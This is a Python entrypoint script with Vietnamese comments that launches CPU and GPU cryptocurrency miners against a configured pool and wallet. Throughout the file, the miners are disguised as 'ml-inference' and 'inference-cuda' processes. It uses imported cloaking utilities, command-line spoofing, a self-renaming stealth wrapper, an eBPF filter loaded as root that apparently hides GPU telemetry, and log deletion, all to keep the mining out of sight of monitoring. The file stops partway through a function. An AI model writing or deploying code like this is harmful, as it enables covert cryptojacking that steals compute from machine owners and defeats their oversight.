
"""
start_mining.py

Entrypoint chính để khởi động toàn bộ hệ thống khai thác tiền điện tử.
"""

import os
import sys
import subprocess
import threading
import signal
import time
import re
import logging
import json  # ✅ [JSON] (JavaScript Object Notation – định dạng dữ liệu cấu hình)
import select  # ✅ [select] (thư viện chọn I/O đa kênh – non-blocking)
from pathlib import Path
from datetime import datetime

# Thêm thư mục **script** (kịch bản) vào sys.path để **resolve** (phân giải đường dẫn) các **local module imports** (nhập module cục bộ)
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import psutil
# **Import** (nhập khẩu) **cloaking utilities** (tiện ích che giấu – ẩn danh hóa tiến trình) cho **ml-inference process stealth** (chế độ ẩn danh của tiến trình suy luận máy học)
from mining_environment.cpu_plugins.cloaking_lib.utils import (
    get_process_by_cmdline,
    spoof_cmdline,
    restore_cmdline,
    create_stealth_subprocess,
)

# **Import** (nhập khẩu) các **module** (mô-đun – thành phần chức năng) từ **library** (thư viện) mining_environment
from mining_environment.scripts.logging_config import setup_logging
from mining_environment.scripts.module_loggers import (
    get_cpu_plugin_logger, 
    get_gpu_plugin_logger,
    log_cpu_plugin_operation,
    log_gpu_plugin_operation
)
from mining_environment.scripts import setup_env
from mining_environment.scripts.resource_manager import ResourceManager
from mining_environment.scripts.auxiliary_modules.models import ConfigModel
from mining_environment.scripts.auxiliary_modules.event_bus import EventBus
from mining_environment.scripts.privileged_operations import get_privileged_manager

# **Import** (nhập khẩu) **Mining Performance Logger** (trình ghi nhật ký hiệu suất khai thác – theo dõi và ghi lại các chỉ số)
from mining_environment.logging.mining_performance_logger import (
    register_mining_process,
    log_hash_rate,
    log_resource_usage,
    log_mining_operation,
    get_real_time_metrics,
    generate_performance_comparison,
    mining_perf_logger
)

# Thiết lập **log directory path** (đường dẫn thư mục logs – nơi lưu trữ các tệp ghi nhật ký)
LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
os.makedirs(LOGS_DIR, exist_ok=True)

# **Main application logger** (logger ứng dụng chính)
logger = setup_logging('start_mining', str(Path(LOGS_DIR) / 'start_mining.log'), 'INFO')

# ---------- DEBUG CPU LOGGING BOOSTER ----------
try:
    from mining_environment.scripts.unified_logging import get_unified_logger
    CPU_LOGGERS = [
        'mining_environment.resource_control',
        'mining_environment.cloak_strategies',
        'cpu_plugin',
        'gpu_plugin',  # nếu muốn thấy plugin GPU
        'optimized_calc_chain',
        'mining_environment.cpu_plugins.optimization.mining_integration_adapter',
    ]
    for _name in CPU_LOGGERS:
        _lg = get_unified_logger(_name)
        _lg.setLevel(logging.DEBUG)
        for _h in _lg.handlers:
            _h.setLevel(logging.DEBUG)
        _lg.debug('===== DEBUG MODE ENABLED (auto-booster) =====')
except Exception as _dbg_err:
    logger.warning(f'DEBUG booster init failed: {_dbg_err}')
# ---------- END BOOSTER ----------

# **Dedicated Module Loggers** (Logger mô-đun chuyên dụng)
cpu_miner_logger = setup_logging('cpu_miner', str(Path(LOGS_DIR) / 'cpu_miner.log'), 'INFO')
gpu_miner_logger = setup_logging('gpu_miner', str(Path(LOGS_DIR) / 'gpu_miner.log'), 'INFO')
cpu_plugin_logger = setup_logging('cpu_plugin', str(Path(LOGS_DIR) / 'cpu_plugin.log'), 'INFO')
gpu_plugin_logger = setup_logging('gpu_plugin', str(Path(LOGS_DIR) / 'gpu_plugin.log'), 'INFO')

stop_event = threading.Event()
process_lock = threading.Lock()
cpu_process = None
gpu_process = None

# Thêm biến privileged_manager_global để chia sẻ kết quả thiết lập môi trường giữa các luồng
privileged_manager_global = None


def signal_handler(signum, frame):
    logger.info(f"Nhận tín hiệu dừng ({signum}). Đang dừng hệ thống khai thác...")
    stop_event.set()

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def initialize_environment():
    """**Thread-safe environment initialization** (khởi tạo môi trường an toàn luồng) với **enhanced error handling** (xử lý lỗi nâng cao)"""
    logger.info("Bắt đầu thiết lập môi trường khai thác (Thread-Safe Mode).")
    
    try:
        # **Step 1: Privileged Manager** (Bước 1: Trình quản lý đặc quyền)
        logger.info("🔐 Initializing privileged manager...")
        privileged_manager = get_privileged_manager(logger)
        
        # **Step 2: Security Context Validation** (Bước 2: Xác thực bối cảnh bảo mật)
        logger.info("🔒 Validating security context...")
        security_context = privileged_manager.validate_security_context()
        logger.info(f"✅ Bối cảnh bảo mật: User={security_context['user']}, Root={security_context['is_root']}")
        
        if not security_context['is_root']:
            logger.warning("⚠️ Không chạy với quyền root - một số tính năng có thể không hoạt động")
        
        # **Step 3: GPU Access Check** (Bước 3: Kiểm tra truy cập GPU)
        logger.info("🎮 Checking GPU access...")
        gpu_info = privileged_manager.check_gpu_access()
        logger.info(f"✅ Truy cập GPU: Available={gpu_info['nvidia_smi_available']}, Count={gpu_info['gpu_count']}")
        
        # **Step 4: eBPF Filter Loading** (Bước 4: Tải bộ lọc eBPF)
        if os.getenv('ENABLE_EBPF_CLOAK', '1') == '1':
            logger.info("🔧 Loading eBPF telemetry filter...")
            preferred_path = "/opt/ebpf_filters/gpu_telemetry_filter.bpf.o"
            legacy_path = "/opt/ebpf_filters/gpu_filter.o"
            ebpf_path = preferred_path if os.path.exists(preferred_path) else legacy_path
            
            if os.path.exists(ebpf_path) and os.path.getsize(ebpf_path) > 0:
                if privileged_manager.load_ebpf_program(ebpf_path):
                    logger.info("✅ Đã load eBPF telemetry filter thành công")
                else:
                    logger.warning("⚠️ Không thể load eBPF telemetry filter")
            else:
                logger.info("ℹ️ eBPF filter object không tồn tại, chạy ở mock mode")
        
        # **Step 5: Environment Setup** (Bước 5: Thiết lập môi trường)
        logger.info("🌍 Running centralized environment setup...")
        setup_env.setup()
        logger.info("✅ Thiết lập môi trường thành công.")
        
        return privileged_manager
        
    except Exception as e:
        error_msg = f"Lỗi khi thiết lập môi trường: {e}"
        logger.error(f"❌ {error_msg}")
        logger.error(f"🔍 Exception details: {type(e).__name__}: {str(e)}")
        
        # **Thread-safe error propagation** (truyền lỗi an toàn luồng)
        stop_event.set()
        raise RuntimeError(error_msg) from e
        
def start_resource_manager():
    """
    **DEPRECATED**: **Direct ResourceManager startup** (khởi động ResourceManager trực tiếp) - 
    **Replaced by resource_manager_thread()** (thay thế bằng resource_manager_thread())
    
    Note: Hàm này giữ lại để **backward compatibility** (tương thích ngược)
    """
    logger.warning("⚠️ start_resource_manager() is deprecated - use resource_manager_thread() instead")
    return None
    
    def resource_manager_worker():
        """
        **Worker function** (hàm công việc) chạy ResourceManager trực tiếp trong **separate thread** (luồng riêng biệt).
        """
        try:
            # **Step 1**: Load configuration từ JSON
            logger.info("📋 Step 1/4: Loading configuration from JSON...")
            config_path = Path(os.getenv('CONFIG_DIR', '/app/mining_environment/config')) / "resource_config.json"
            
            if not config_path.exists():
                raise FileNotFoundError(f"Configuration file not found: {config_path}")
                
            with open(config_path, 'r') as f:
                config_data = json.loads(f.read())
            
            config = ConfigModel(**config_data)
            logger.info("✅ Configuration loaded successfully")
            
            # **Step 2**: Initialize EventBus với **memory backend** (bộ xử lý bộ nhớ)
            logger.info("📋 Step 2/4: Initializing EventBus with memory backend...")
            event_bus = EventBus()
            logger.info("✅ EventBus initialized successfully")
            
            # **Step 3**: Create ResourceManager instance
            logger.info("📋 Step 3/4: Creating ResourceManager instance...")
            resource_manager = ResourceManager(config, event_bus, logger)
            logger.info("✅ ResourceManager instance created")
            
            # **Step 4**: Start ResourceManager
            logger.info("📋 Step 4/4: Starting ResourceManager...")
            resource_manager.start()
            logger.info("🎯 ResourceManager đã được khởi động thành công")
            
        except Exception as e:
            error_msg = f"❌ Lỗi khi khởi động ResourceManager: {e}"
            logger.error(error_msg)
            logger.error(f"🔍 Exception details: {str(e)}")
            stop_event.set()
    
    # Tạo **background thread** (luồng nền) cho ResourceManager
    resource_thread = threading.Thread(
        target=resource_manager_worker,
        daemon=True,  # **Daemon thread** (luồng nền) sẽ tự động kết thúc khi main program kết thúc
        name="ResourceManagerThread"
    )
    
    # Khởi động **thread** (luồng) và **không chờ** nó hoàn thành (**non-blocking**)
    resource_thread.start()
    logger.info(f"✅ ResourceManager thread đã được khởi động (Thread ID: {resource_thread.ident})")
    
    # **Enhanced verification** (xác minh nâng cao) với **timeout protection** (bảo vệ timeout)
    verification_timeout = 5  # 5 giây thay vì 1 giây
    for i in range(verification_timeout):
        time.sleep(1)
        if resource_thread.is_alive():
            logger.debug(f"🔍 ResourceManager thread verification: alive ({i+1}/{verification_timeout}s)")
        else:
            logger.warning(f"⚠️ ResourceManager thread đã dừng sau {i+1}s")
            stop_event.set()
            break
    
    if resource_thread.is_alive():
        logger.info("🎯 ResourceManager thread đang chạy bình thường - Main thread có thể tiếp tục")
    else:
        logger.warning("⚠️ ResourceManager thread đã dừng ngay sau khi khởi động")
        stop_event.set()
    
    return resource_thread

def stop_resource_manager():
    """
    **DEPRECATED**: **Stop ResourceManager** (dừng ResourceManager) - 
    **Replaced by thread-based cleanup** (thay thế bằng dọn dẹp dựa trên luồng)
    
    Note: ResourceManager shutdown is now handled by thread termination
    """
    logger.warning("⚠️ stop_resource_manager() is deprecated - shutdown handled by thread cleanup")
    stop_event.set()

def is_mining_process_running(process):
    """
    ✅ ENHANCED: Kiểm tra tiến trình khai thác còn "sống" (running) hay không.
    - Trả về True khi `.poll()` chưa có mã thoát (None) **hoặc** mã thoát = 0 
      (một số wrapper script fork rồi thoát 0 ngay lập tức – nhưng tiến trình con vẫn chạy).
    """
    return bool(process) and (process.poll() is None or process.returncode == 0)

def rotate_log_file(log_path, max_size_mb=3):
    """
    **Log rotation** (xoay vòng tệp ghi nhật ký) để tránh **disk space issues** (vấn đề dung lượng đĩa cứng).
    **Delete log files** (xóa tệp nhật ký) khi vượt quá **size limit** (giới hạn kích thước).
    
    Args:
        log_path (str): Đường dẫn đến tệp log cần xoay vòng
        max_size_mb (int): Kích thước tối đa (MB) trước khi xóa (mặc định: 3MB)
    """
    if not os.path.exists(log_path):
        return
        
    file_size_mb = os.path.getsize(log_path) / (1024 * 1024)
    if file_size_mb > max_size_mb:
        os.remove(log_path)
        logger.info(f"Đã xóa tệp log do vượt quá {max_size_mb}MB: {log_path} (kích thước: {file_size_mb:.2f}MB)")

def dual_logger_thread(process, log_file, process_name, log_lock):
    """
    Ghi nhật ký kép an toàn luồng nâng cao - truyền dữ liệu thời gian thực với phát hiện tốc độ băm và theo dõi các chỉ số hiệu suất.

    
    Args:
        process: Tiến trình cần theo dõi và ghi log
        log_file: Tệp log để ghi dữ liệu
        process_name (str): Tên tiến trình để hiển thị
        log_lock: Khóa luồng để đảm bảo thread-safe
    """
    hash_rates = []  # **Hash rate tracking** (theo dõi tốc độ băm – ghi lại các giá trị tốc độ tính toán)
    start_time = time.time()
    line_count = 0
    
    try:
        while True:
            # **Non-blocking I/O** (nhập/xuất không chặn) với **select** (chọn lọc dữ liệu)
            ready, _, _ = select.select([process.stdout], [], [], 1.0)
            if not ready:
                # **Process termination check** (kiểm tra trạng thái kết thúc tiến trình)
                if process.poll() is not None:
                    break
                continue

            line = process.stdout.readline()
            # **EOF detection** (phát hiện kết thúc tệp dữ liệu)
            if line == '' and process.poll() is not None:
                break
                
            if line:
                line_count += 1
                
                # **Thread-safe logging block** (khối ghi nhật ký an toàn luồng)
                with log_lock:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    runtime = time.time() - start_time
                    
                    # **Enhanced log format** (định dạng nhật ký nâng cao) với **runtime info** (thông tin thời gian vận hành)
                    formatted_line = f"[{timestamp}][{process_name}][R:{runtime:.0f}s] {line.strip()}"
                    
                    # **Color-coded terminal output** (đầu ra terminal có mã màu – hiển thị với màu sắc phân biệt)
                    if "error" in line.lower() or "failed" in line.lower():
                        terminal_output = f"\033[91m{formatted_line}\033[0m"  # Red
                    elif "H/s" in line or "accepted" in line.lower():
                        terminal_output = f"\033[92m{formatted_line}\033[0m"  # Green
                    elif "connecting" in line.lower() or "started" in line.lower():
                        terminal_output = f"\033[94m{formatted_line}\033[0m"  # Blue
                    else:
                        terminal_output = formatted_line
                    
                    # **Real-time terminal display** (hiển thị terminal thời gian thực – cập nhật ngay lập tức)
                    print(terminal_output, flush=True)
                    
                    # **File logging** (ghi nhật ký vào tệp) - **binary mode** (chế độ nhị phân)
                    log_file.write(f"{formatted_line}\n".encode('utf-8'))
                    log_file.flush()
                    
                    # **Log rotation check** (kiểm tra xoay vòng tệp nhật ký) - **delete when over 3MB** (xóa khi vượt quá 3MB)
                    try:
                        if log_file.tell() > 3 * 1024 * 1024:  # 3MB limit
                            current_path = log_file.name
                            log_file.close()
                            os.remove(current_path)
                            logger.info(f"🗑️ Đã xóa log do vượt quá 3MB: {current_path}")
                            # **Reopen new file** (mở lại tệp mới)
                            log_file = open(current_path, 'ab', buffering=0)
                    except Exception as rot_err:
                        logger.warning(f"⚠️ Xóa log thất bại: {rot_err}")
                    
                    # **Advanced hash rate detection** (phát hiện tốc độ băm nâng cao – nhận diện các chỉ số hiệu suất)
                    hash_rate_match = re.search(r'(\d+(?:\.\d+)?)\s*(H/s|KH/s|MH/s|GH/s|TH/s)', line)
                    if hash_rate_match:
                        hash_rate = float(hash_rate_match.group(1))
                        unit = hash_rate_match.group(2)
                        
                        # **Unit conversion** (chuyển đổi đơn vị đo lường)
                        multiplier = {
                            'H/s': 1,
                            'KH/s': 1000,
                            'MH/s': 1000000,
                            'GH/s': 1000000000,
                            'TH/s': 1000000000000
                        }
                        hash_rate_hz = hash_rate * multiplier.get(unit, 1)
                        
                        # **Hash rate tracking** (theo dõi và lưu trữ tốc độ băm)
                        hash_rates.append(hash_rate_hz)
                        
                        # **Performance metrics calculation** (tính toán các chỉ số hiệu suất chi tiết)
                        if len(hash_rates) >= 5:  # **Moving average** (trung bình trượt) của 5 mẫu dữ liệu
                            recent_avg = sum(hash_rates[-5:]) / 5
                            total_avg = sum(hash_rates) / len(hash_rates)
                            
                            # **Real-time metrics display** (hiển thị các chỉ số thời gian thực)
                            metrics_line = (f"\033[96m📊 METRICS [{process_name}]: "
                                          f"Current={hash_rate:.2f} {unit} | "
                                          f"Avg5={recent_avg:.2f} H/s | "
                                          f"TotalAvg={total_avg:.2f} H/s | "
                                          f"Samples={len(hash_rates)} | "
                                          f"Runtime={runtime:.0f}s\033[0m")
                            print(metrics_line, flush=True)
                        
                        # **Log hash rate** (ghi nhật ký tốc độ băm) để **performance system** (hệ thống theo dõi hiệu suất)
                        log_hash_rate(process_name, hash_rate_hz)
                    
                    # **Status indicators** (chỉ báo trạng thái hoạt động) mỗi 100 dòng
                    if line_count % 100 == 0:
                        status_line = (f"\033[93m📈 STATUS [{process_name}]: "
                                     f"Lines={line_count} | Runtime={runtime:.0f}s | "
                                     f"HashSamples={len(hash_rates)}\033[0m")
                        print(status_line, flush=True)
                        
    except Exception as e:
        error_msg = f"❌ Lỗi trong dual_logger_thread [{process_name}]: {e}"
        logger.error(error_msg)
        print(f"\033[91m{error_msg}\033[0m", flush=True)
    finally:
        # **Cleanup** (dọn dẹp tài nguyên) và **final stats** (thống kê cuối cùng)
        try:
            if log_file and not log_file.closed:
                log_file.close()
            
            runtime = time.time() - start_time
            final_stats = (f"\033[95m🏁 FINAL STATS [{process_name}]: "
                         f"Runtime={runtime:.0f}s | Lines={line_count} | "
                         f"HashSamples={len(hash_rates)}")
            if hash_rates:
                total_avg = sum(hash_rates) / len(hash_rates)
                final_stats += f" | AvgHashRate={total_avg:.2f} H/s"
            final_stats += "\033[0m"
            
            print(final_stats, flush=True)
            logger.info(f"Luồng ghi log kép đã dừng cho {process_name}: thời gian chạy {runtime:.0f}s")
            
        except Exception as cleanup_err:
            logger.error(f"Lỗi dọn dẹp trong dual_logger_thread: {cleanup_err}")

def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
    """
    **Enhanced mining process** (quy trình khai thác nâng cao) với **dual logging** (ghi nhật ký kép), 
    **log rotation** (xoay vòng tệp nhật ký), và **thread-safe logging** (ghi nhật ký an toàn luồng).
    
    Args:
        cpu (bool): True nếu là khai thác CPU, False nếu là GPU
        retries (int): Số lần thử lại tối đa
        delay (int): Thời gian chờ giữa các lần thử (giây)
        privileged_manager: Trình quản lý quyền hạn
    
    Returns:
        subprocess.Popen: Tiến trình khai thác nếu thành công, None nếu thất bại
    """
    executable = os.getenv('ML_COMMAND' if cpu else 'CUDA_COMMAND')
    if not executable or not os.path.isfile(executable) or not os.access(executable, os.X_OK):
        logger.error(f"Tệp thực thi khai thác không hợp lệ hoặc không có quyền truy cập: {executable}")
        stop_event.set()
        return None

    mining_server = os.getenv('MINING_SERVER_CPU' if cpu else 'MINING_SERVER_GPU')
    mining_wallet = os.getenv('MINING_WALLET_CPU' if cpu else 'MINING_WALLET_GPU')
    if not mining_server or not mining_wallet:
        logger.error("Các biến môi trường MINING_SERVER hoặc MINING_WALLET chưa được cấu hình.")
        stop_event.set()
        return None

    miner_tag = 'cpu' if cpu else 'gpu'
    miner_log_path = Path(LOGS_DIR) / f"{miner_tag}_miner.log"
    
    # **Log rotation** (xoay vòng tệp nhật ký) trước khi khởi chạy tiến trình
    rotate_log_file(str(miner_log_path))
    
    # **Thread-safe lock** (khóa an toàn luồng) cho **dual logging** (ghi nhật ký kép)
    log_lock = threading.Lock()

    # Xác định **process name** (tên tiến trình) từ **resource_config.json** (tệp cấu hình tài nguyên hệ thống)
    process_name = "ml-inference" if cpu else "inference-cuda"
    
    # **Plugin logging integration** (tích hợp ghi log plugin)
    if cpu:
        log_cpu_plugin_operation("PROCESS_STARTUP", f"Starting {process_name} mining process", "INFO")
    else:
        log_gpu_plugin_operation("PROCESS_STARTUP", f"Starting {process_name} mining process", "INFO")
    
    mining_command = [executable, '-o', mining_server, '-u', mining_wallet, '--tls']
    if cpu:
        mining_command.extend(['-a', 'rx/0', '--no-huge-pages'])
    else:
        cuda_loader = os.getenv('MLLS_CUDA', '/usr/local/bin/libmlls-cuda.so')
        mining_command.extend(['--cuda', f'--cuda-loader={cuda_loader}', '-a', 'kawpow'])

    enable_ns = os.getenv('ENABLE_NS_ISOLATION', '1') == '1'
    enable_stealth = os.getenv('ENABLE_STEALTH_MODE', '1') == '1'
    
    if enable_ns and privileged_manager:
        logger.info("Sử dụng PrivilegedOperationManager cho **namespace isolation** (cô lập không gian tên)")

    for attempt in range(1, retries + 1):
        logger.info(f"Thử khởi chạy quá trình khai thác {'CPU' if cpu else 'GPU'} (Lần thử {attempt}/{retries})...")
        # **Debug logging** (ghi nhật ký gỡ lỗi) cho **GPU process creation** (tạo tiến trình GPU)
        if not cpu:
            logger.info(f"🔍 GPU Debug - Command: {' '.join(mining_command)}")
            logger.info(f"🔍 GPU Debug - Stealth: {enable_stealth}, NS: {enable_ns}")
        try:
            # **Create subprocess** (tạo tiến trình con) với **PIPE** (đường ống) cho **dual logging** (ghi log kép)
            if enable_stealth and cpu:
                # **Self-Stealth subprocess** (tiến trình con tự ẩn danh) - sử dụng stealth wrapper
                stealth_wrapper_path = os.path.join(
                    os.path.dirname(os.path.abspath(__file__)),
                    "mining_environment", "scripts", "stealth_ml_inference.py"
                )
                
                if os.path.exists(stealth_wrapper_path):
                    # Sử dụng **[Self-Stealth Wrapper]** (wrapper tự ẩn danh) thay vì external spoof
                    stealth_command = [sys.executable, stealth_wrapper_path] + mining_command[1:]  # Remove executable, keep args
                    logger.info(f"🔒 [SELF-STEALTH] Using stealth wrapper: {stealth_wrapper_path}")
                    
                    process = subprocess.Popen(
                        stealth_command,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        universal_newlines=True,
                        bufsize=1
                    )
                    if process:
                        logger.info(f"✅ [SELF-STEALTH] Stealth process started with PID: {process.pid}")
                        logger.info(f"🔍 [SELF-STEALTH] Process will self-rename using internal stealth manager")
                else:
                    # Fallback to standard subprocess nếu wrapper không tồn tại
                    logger.warning(f"⚠️ [SELF-STEALTH] Stealth wrapper not found: {stealth_wrapper_path}")
                    logger.warning("⚠️ [SELF-STEALTH] Falling back to standard subprocess - no stealth")
                    process = subprocess.Popen(
                        mining_command,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        universal_newlines=True,
                        bufsize=1
                    )
            elif enable_ns and privileged_manager:
                # **Namespace isolation** (cô lập namespace) - **modified for dual logging** (sửa đổi cho ghi log kép)
                logger.info(f"🔍 {'GPU' if not cpu else 'CPU'} using namespace isolation")
                process = subprocess.Popen(
                    mining_command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    universal_newlines=True,
                    bufsize=1
                )
            else:
                # **Standard subprocess** (tiến trình con tiêu chuẩn)
                logger.info(f"🔍 {'GPU' if not cpu else 'CPU'} using standard subprocess")
                process = subprocess.Popen(
                    mining_command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    universal_newlines=True,
                    bufsize=1
                )
            
            if process:
                startup_time = time.time()
                miner_type = 'CPU' if cpu else 'GPU'
                logger.info(f"🔍 {miner_type} process created successfully with PID: {process.pid}")
                
                # **Enhanced startup logging** (ghi log khởi động nâng cao)
                startup_msg = (f"🚀 MINING PROCESS STARTED [{miner_type}]\n"
                             f"   ├─ Process Name: {process_name}\n"
                             f"   ├─ PID: {process.pid}\n"
                             f"   ├─ Command: {' '.join(mining_command)}\n"
                             f"   ├─ Log File: {miner_log_path}\n"
                             f"   ├─ Stealth Mode: {enable_stealth and cpu}\n"
                             f"   └─ Namespace Isolation: {enable_ns and privileged_manager is not None}")
                
                logger.info(startup_msg)
                print(f"\033[92m{startup_msg}\033[0m", flush=True)  # Green startup message
                
                # **Register process** (đăng ký tiến trình) với **Mining Performance Logger** (trình ghi log hiệu suất khai thác)
                register_mining_process(process_name, process.pid, process)
                
                # **Detailed operation logging** (ghi log thao tác chi tiết) - ĐỊNH NGHĨA TRƯỚC KHI SỬ DỤNG
                operation_details = {
                    'process_name': process_name,
                    'pid': process.pid,
                    'miner_type': miner_type.lower(),
                    'command': ' '.join(mining_command),
                    'startup_time': startup_time,
                    'stealth_enabled': enable_stealth and cpu,
                    'namespace_isolation': enable_ns and privileged_manager is not None,
                    'log_file': str(miner_log_path)
                }
                
                # **DEBUG: Force initial logging** (gỡ lỗi: buộc ghi log ban đầu) để kiểm tra logger hoạt động
                logger.info(f"🔍 DEBUG: Attempting to log initial mining operation for {process_name}")
                log_mining_operation(process_name, "PROCESS_START", process.pid, operation_details, 0.0, "SUCCESS")
                logger.info(f"🔍 DEBUG: Initial resource usage logging for {process_name}")
                log_resource_usage(process_name, force_gpu_check=(not cpu))
                
                logger.info(f"PROCESS_START: {process_name} | PID={process.pid} | TYPE={miner_type} | TIME={startup_time}")
                
                # **EventBus publish** (xuất bản sự kiện) - **PID Propagation Flow Step 1**
                try:
                    from mining_environment.scripts.auxiliary_modules.event_bus import get_event_bus
                    from datetime import datetime
                    
                    event_bus = get_event_bus()
                    miner_type = 'cpu' if cpu else 'gpu'
                    
                    payload = {
                        'pid': process.pid,
                        'miner_type': miner_type,
                        'timestamp': time.time(),
                        'event_type': 'mining_started',
                        'data': {
                            'process_name': process_name,
                            'command': ' '.join(mining_command),
                            'stealth_mode': enable_stealth and cpu,
                            'namespace_isolation': enable_ns and privileged_manager is not None
                        }
                    }
                    
                    # **Publish** (xuất bản) to channel với retry logic
                    # ✅ PHASE 2 REFACTORING: Chuẩn hóa Event Naming Conventions
                    # Dual publishing approach để đảm bảo backward compatibility
                    
                    # Legacy format (sẽ được deprecated trong future releases)
                    event_bus.publish(f'channel:{miner_type}', payload)
                    logger.info(f"✅ Published mining_started event to channel:{miner_type} for PID {process.pid}")
                    
                    # New standardized format: domain:action pattern
                    new_event_name = f'mining:{miner_type}_started'
                    event_bus.publish(new_event_name, payload)
                    logger.info(f"✅ Published mining_started event to {new_event_name} for PID {process.pid} (new format)")
                    
                except Exception as e:
                    logger.error(f"❌ Failed to publish mining_started event: {e}")
                    # **Không dừng tiến trình** nếu EventBus thất bại - **fallback** vẫn hoạt động
                
                # ✅ ENHANCED: Ensure log file creation với initial logging
                logger.info(f"📁 [Mining Log] Creating log file: {miner_log_path}")
                
                # **Open log file** (mở tệp log) cho **dual logging** (ghi log kép)
                log_file = open(miner_log_path, 'ab', buffering=0)
                
                # ✅ ENHANCED: Initial log entry để confirm file creation
                initial_log = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] ===== MINING LOG STARTED =====\n"
                initial_log += f"Process: {process_name} (PID: {process.pid})\n"
                initial_log += f"Command: {' '.join(mining_command)}\n"
                initial_log += f"Log File: {miner_log_path}\n"
                initial_log += f"========================================\n"
                log_file.write(initial_log.encode('utf-8'))
                log_file.flush()
                
                logger.info(f"✅ [Mining Log] Log file initialized: {miner_log_path}")
                
                # **Start dual logging thread** (khởi chạy luồng ghi log kép)
                log_thread = threading.Thread(
                    target=dual_logger_thread,
                    args=(process, log_file, process_name, log_lock),
                    daemon=True
                )
                log_thread.start()
                logger.info(f"🚀 [Mining Log] Dual logging thread started for {process_name}")
                
                # **Start simple log monitoring** (bắt đầu giám sát log đơn giản) - **remove JSON format** (loại bỏ định dạng JSON)
                mining_perf_logger.monitor_process_logs(process_name, str(miner_log_path))
                
                time.sleep(2)
                if process.poll() is not None:
                    logger.error(f"Quá trình khai thác {'CPU' if cpu else 'GPU'} kết thúc sớm.")
                    
                    # **Enhanced plugin logging for failures** (ghi log plugin nâng cao cho lỗi)
                    error_details = f"PID={process.pid} EXIT_CODE={process.returncode}"
                    if cpu:
                        log_cpu_plugin_operation("PROCESS_FAILURE", f"Early termination: {error_details}", "ERROR")
                    else:
                        log_gpu_plugin_operation("PROCESS_FAILURE", f"Early termination: {error_details}", "ERROR")
                    
                    # **Simple early termination logging** (ghi log kết thúc sớm đơn giản)
                    logger.error(f"EARLY_TERMINATION: {process_name} {error_details}")
                    process = None
                else:
                    # **Success logging** (ghi log thành công)
                    success_details = f"PID={process.pid} Command={' '.join(mining_command)}"
                    if cpu:
                        log_cpu_plugin_operation("PROCESS_SUCCESS", f"Mining process started: {success_details}", "INFO")
                    else:
                        log_gpu_plugin_operation("PROCESS_SUCCESS", f"Mining process started: {success_details}", "INFO")
                    
                    return process
                    
        except Exception as e:
            logger.error(f"Lỗi khi khởi động quá trình khai thác {'CPU' if cpu else 'GPU'}: {e}")
            # **Additional debug info** (thông tin gỡ lỗi bổ sung) cho **GPU failures** (lỗi GPU)
            if not cpu:
                logger.error(f"🔍 GPU Error Details - Exception: {type(e).__name__}: {str(e)}")
                logger.error(f"🔍 GPU Error Details - Command: {' '.join(mining_command)}")
            process = None
        if attempt < retries:
            logger.info(f"Đợi {delay} giây trước khi thử lại...")
            time.sleep(delay)
    logger.error(f"Không thể khởi chạy quá trình khai thác {'CPU' if cpu else 'GPU'}.")
    stop_event.set()
    return None

def manage_cpu_miner(privileged_mgr, max_retries: int = 5):
    """
    **DEPRECATED**: Quản lý **lifecycle** (vòng đời) của **CPU miner** (máy khai thác CPU) - 
    **Replaced by cpu_mining_thread()** (thay thế bằng cpu_mining_thread())
    
    Note: Hàm này giữ lại để **backward compatibility** (tương thích ngược)
    """
    logger.warning("⚠️ manage_cpu_miner() is deprecated - use cpu_mining_thread() instead")
    return
    
    # **Enhanced initial logging** (ghi log ban đầu nâng cao)
    cpu_miner_logger.info("===== CPU MINER LIFECYCLE STARTED =====")
    cpu_miner_logger.info(f"Manager PID: {os.getpid()}")
    cpu_miner_logger.info(f"Thread ID: {threading.current_thread().ident}")
    cpu_miner_logger.info(f"Max Retries: {max_retries}")
    cpu_miner_logger.info("=========================================")
    
    # **Notify main logger** (thông báo logger chính)
    logger.info("✅ CPU Miner Manager initialized with dedicated logging")
    
    # **Enhanced mining loop** (vòng lặp khai thác nâng cao)
    cpu_miner_logger.info("🔄 Starting CPU mining supervision loop...")
    
    while not stop_event.is_set() and retries < max_retries:
        with process_lock:
            if not is_mining_process_running(cpu_process):
                cpu_miner_logger.info(f"🔄 CPU process not running - attempting startup (attempt {retries + 1}/{max_retries})")
                cpu_process = start_mining_process(cpu=True, privileged_manager=privileged_mgr)
                if not is_mining_process_running(cpu_process):
                    retries += 1
                    cpu_miner_logger.warning(f"❌ CPU miner startup failed - retry {retries}/{max_retries}")
                    logger.warning(f"CPU miner khởi động thất bại. Thử lại... ({retries}/{max_retries})")
                else:
                    cpu_miner_logger.info(f"✅ CPU miner started successfully - PID: {cpu_process.pid if cpu_process else 'Unknown'}")
                    logger.info("CPU miner đã khởi động thành công.")
                    retries = 0  # Reset retries on successful start
            else:
                # **Process running - log status** (tiến trình đang chạy - ghi log trạng thái)
                retries = 0
                cpu_miner_logger.debug(f"📊 CPU miner running normally - PID: {cpu_process.pid if cpu_process else 'Unknown'}")
                
                # **Log resource usage** (ghi log mức sử dụng tài nguyên)
                log_resource_usage("ml-inference")
        
        # **Wait với detailed logging** (đợi với ghi log chi tiết)
        cpu_miner_logger.debug("⏳ Waiting 30s before next supervision cycle")
        stop_event.wait(30)
    
    if retries >= max_retries:
        cpu_miner_logger.error(f"🚨 CPU miner failed {max_retries} times - stopping supervision")
        logger.error("CPU miner đã thất bại quá nhiều lần. Dừng giám sát.")
        stop_event.set()
    
    cpu_miner_logger.info("===== CPU MINER LIFECYCLE ENDED =====")

def manage_gpu_miner(privileged_mgr, max_retries: int = 5):
    """
    **DEPRECATED**: Quản lý **lifecycle** (vòng đời) của **GPU miner** (máy khai thác GPU) - 
    **Replaced by gpu_mining_thread()** (thay thế bằng gpu_mining_thread())
    
    Note: Hàm này giữ lại để **backward compatibility** (tương thích ngược)
    """
    logger.warning("⚠️ manage_gpu_miner() is deprecated - use gpu_mining_thread() instead")
    return
    
    # **Enhanced initial logging** (ghi log ban đầu nâng cao)
